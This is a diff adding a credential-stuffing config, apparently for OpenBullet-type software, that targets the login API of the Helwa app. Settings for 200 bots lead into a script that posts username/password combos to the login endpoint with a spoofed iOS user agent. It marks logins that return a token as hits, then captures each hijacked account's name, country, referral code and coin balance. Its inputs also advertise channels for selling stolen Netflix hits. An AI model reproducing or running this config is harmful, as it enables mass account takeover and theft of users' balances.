@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Helwa {GIFT CARDS}",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-21T00:36:48.3565511-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLordConfigs",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "IF YOU WANT SEND YOUR NETFLIX HITS VS VHQ PROXY > @MasterLord007",
+      "VariableName": "",
+      "Id": 829159540
+    },
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 1360478525
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://helwa.io:5000/api/user_login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: helwa.io:5000" 
+  HEADER "Content-Type: application/json;charset=utf-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Helwa/4 CFNetwork/978.0.7 Darwin/18.7.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "language: null" 
+  HEADER "userid: undefined" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: undefined" 
+  HEADER "Content-Length: 56" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Your email/password is incorrect. Please try again." 
+    KEY "email or password not provided" 
+
+#NAME PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Name" 
+
+#COUNTRY PARSE "<SOURCE>" JSON "value" CreateEmpty=FALSE -> CAP "Country" 
+
+#REFERRAL_CODE PARSE "<SOURCE>" JSON "referral_code" CreateEmpty=FALSE -> CAP "Referral Code" 
+
+#COINS PARSE "<SOURCE>" LR "total_coins\":" "," CreateEmpty=FALSE -> CAP "Coins" 
+
+#CREATOR FUNCTION Constant "@MasterLordConfigs" -> CAP "Config By" 
+
